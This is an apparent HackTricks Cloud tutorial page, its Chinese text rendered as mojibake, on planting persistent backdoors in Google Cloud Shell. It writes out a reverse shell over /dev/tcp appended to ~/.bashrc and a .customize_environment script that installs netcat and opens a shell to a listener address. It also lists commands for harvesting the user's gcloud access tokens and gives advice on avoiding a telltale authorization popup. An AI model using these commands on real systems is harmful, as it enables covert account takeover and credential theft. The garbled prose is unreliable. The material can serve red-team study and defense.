# GCP - äº‘ShellæŒä¹…æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**
*
*
*
* githubä»“åº“ã€‚

</details>

## äº‘Shell

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### æŒä¹…åé—¨

[**Google Cloud Shell**](https://cloud.google.com/shell/)ä¸ºæ‚¨æä¾›äº†ç›´æ¥ä»æµè§ˆå™¨è®¿é—®äº‘èµ„æºçš„å‘½ä»¤è¡Œè®¿é—®æƒé™ï¼Œè€Œæ— éœ€ä»»ä½•ç›¸å…³è´¹ç”¨ã€‚

æ‚¨å¯ä»¥ä»**Webæ§åˆ¶å°**æˆ–è¿è¡Œ**`gcloud cloud-shell ssh`**æ¥è®¿é—®Googleçš„Cloud Shellã€‚

å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œè¿™ä¸ªæ§åˆ¶å°å…·æœ‰ä¸€äº›æœ‰è¶£çš„åŠŸèƒ½ï¼š

1. **ä»»ä½•å…·æœ‰Google Cloudè®¿é—®æƒé™çš„ç”¨æˆ·**éƒ½å¯ä»¥è®¿é—®ä¸€ä¸ªå®Œå…¨ç»è¿‡èº«ä»½éªŒè¯çš„Cloud Shellå®ä¾‹ï¼ˆå³ä½¿æ˜¯ç»„ç»‡çš„æ‰€æœ‰è€…ä¹Ÿå¯ä»¥ï¼‰ã€‚
2. è¯¥å®ä¾‹å°†åœ¨è‡³å°‘120å¤©å†…**ä¿ç•™å…¶ä¸»ç›®å½•**ï¼Œå¦‚æœæ²¡æœ‰ä»»ä½•æ´»åŠ¨å‘ç”Ÿã€‚
3. **ç»„ç»‡æ²¡æœ‰èƒ½åŠ›ç›‘è§†**è¯¥å®ä¾‹çš„æ´»åŠ¨ã€‚

è¿™åŸºæœ¬ä¸Šæ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„ä¸»ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåé—¨ï¼Œåªè¦ç”¨æˆ·æ¯120å¤©è‡³å°‘è¿æ¥åˆ°GC Shellä¸€æ¬¡ï¼Œåé—¨å°±ä¼šå­˜æ´»ä¸‹æ¥ï¼Œæ”»å‡»è€…æ¯æ¬¡è¿è¡Œæ—¶éƒ½ä¼šè·å¾—ä¸€ä¸ªshellï¼Œåªéœ€æ‰§è¡Œï¼š
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

åœ¨ä¸»ç›®å½•ä¸­è¿˜æœ‰ä¸€ä¸ªåä¸º**`.customize_environment`**çš„æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨ï¼Œæ¯æ¬¡ç”¨æˆ·è®¿é—®**äº‘shell**æ—¶éƒ½ä¼šè¢«**æ‰§è¡Œ**ï¼ˆå°±åƒåœ¨ä¹‹å‰çš„æŠ€æœ¯ä¸­ä¸€æ ·ï¼‰ã€‚åªéœ€æ’å…¥å‰é¢çš„åé—¨æˆ–ç±»ä¼¼ä»¥ä¸‹å†…å®¹çš„åé—¨ï¼Œå³å¯åœ¨ç”¨æˆ·**é¢‘ç¹**ä½¿ç”¨äº‘shellæ—¶ä¿æŒæŒä¹…æ€§ï¼š
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
é‡è¦æç¤ºï¼š**ç¬¬ä¸€æ¬¡æ‰§è¡Œéœ€è¦èº«ä»½éªŒè¯çš„æ“ä½œæ—¶**ï¼Œç”¨æˆ·æµè§ˆå™¨ä¸­ä¼šå‡ºç°ä¸€ä¸ªå¼¹å‡ºæˆæƒçª—å£ã€‚å¿…é¡»åœ¨å‘½ä»¤è¿è¡Œä¹‹å‰æ¥å—æ­¤çª—å£ã€‚å¦‚æœå‡ºç°æ„å¤–å¼¹å‡ºçª—å£ï¼Œå¯èƒ½ä¼šå¼•èµ·æ€€ç–‘ï¼Œå¹¶æ½œåœ¨åœ°å±åŠæ­£åœ¨ä½¿ç”¨çš„æŒä¹…æ€§æ–¹æ³•ã€‚
{% endhint %}

è¿™æ˜¯åœ¨æµè§ˆå™¨ç”¨æˆ·ä¼šè¯ä¸­æŸ¥çœ‹ä½œä¸ºæ”»å‡»è€…æ‰§è¡Œ`gcloud projects list`æ—¶çš„å¼¹å‡ºçª—å£ï¼š

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ç„¶è€Œï¼Œå¦‚æœç”¨æˆ·å·²ç»ç§¯æä½¿ç”¨äº†äº‘shellï¼Œåˆ™ä¸ä¼šå‡ºç°å¼¹å‡ºçª—å£ï¼Œæ‚¨å¯ä»¥**æ”¶é›†ç”¨æˆ·çš„ä»¤ç‰Œ**ï¼š
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSHè¿æ¥æ˜¯å¦‚ä½•å»ºç«‹çš„

åŸºæœ¬ä¸Šï¼Œä½¿ç”¨äº†ä»¥ä¸‹3ä¸ªAPIè°ƒç”¨ï¼š

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST\]ï¼ˆå°†è®©æ‚¨æ·»åŠ æ‚¨åœ¨æœ¬åœ°åˆ›å»ºçš„å…¬é’¥ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST\]ï¼ˆå°†è®©æ‚¨å¯åŠ¨å®ä¾‹ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET\]ï¼ˆå°†å‘Šè¯‰æ‚¨Google Cloud Shellçš„IPï¼‰

ä½†æ‚¨å¯ä»¥åœ¨[https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)ä¸­æ‰¾åˆ°æ›´å¤šä¿¡æ¯

## å‚è€ƒèµ„æ–™

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)
